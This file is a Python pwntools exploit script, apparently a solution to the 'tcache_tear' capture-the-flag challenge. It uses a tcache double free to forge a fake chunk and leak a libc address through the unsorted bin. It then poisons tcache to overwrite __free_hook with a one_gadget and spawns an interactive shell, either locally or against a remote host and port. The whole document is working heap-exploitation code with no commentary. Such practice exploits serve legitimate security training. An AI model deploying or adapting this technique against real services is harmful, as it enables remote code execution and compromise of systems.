#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('tcache_tear_patched')
libc = exe.libc
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def allocate(size, data):
    io.sendlineafter(b":", b"1")
    io.sendlineafter(b"Size:", str(size).encode())
    io.sendafter(b"Data:", data)

def free():
    io.sendlineafter(b":", b"2")

def info():
    io.sendlineafter(b":", b"3")
    io.recvuntil(b":")
    data = io.recvlines(1)[0]
    return data[0x10:0x18]

def register(uname):
    io.sendlineafter(b":", uname)

def solve():
    name = 0x602060

    register(p64(0) + p64(0x501))
    allocate(0xf, b"A"*8)
    
    for i in range(2):
        free()

    allocate(0xf, p64(name + 0x10))
    allocate(0xf, b"junk1")

    bypass_check = (p64(0) * 3) + p64(name + 0x10) + (b"\x00" * (0x500 - 40)) + p64(0x11) + (b"A" * 0x10) + p64(0x11)

    allocate(0xf, bypass_check)
    free()

    main_arena = u64(info())
    libc.address = main_arena - 0x3ebca0
    log.info("main arena: %#x", main_arena)
    log.info("libc base: %#x", libc.address)

    allocate(0x50, b"hmm")

    for i in range(2):
        free()

    og = libc.address + 0x4f322
    allocate(0x50, p64(libc.sym["__free_hook"]))
    allocate(0x50, b"loll")
    allocate(0x50, p64(og))

    free()

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

